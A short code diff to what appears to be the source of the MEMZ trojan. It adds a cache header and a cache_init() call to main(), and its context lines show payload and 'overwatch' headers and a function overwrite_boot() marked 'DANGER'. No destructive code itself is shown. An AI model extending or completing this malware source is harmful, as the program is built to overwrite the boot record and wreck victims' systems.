@@ -3,6 +3,7 @@
 #include <memz/payload_function.h>
 #include <memz/overwatch.h>
 #include <memz/data.h>
+#include <memz/cache.h>
 #include <Windows.h>
 #include <string.h>
 
@@ -49,6 +50,10 @@ void overwrite_boot() // DANGER
 
 int main(int argc, char* argv[])
 {
+    /* Warm up the RAM cache before anything starts hammering it. Every
+     * payload thread calls cache_init() too, it is idempotent. */
+    cache_init();
+
     if (argc == 1)
         start_overwatch();
 
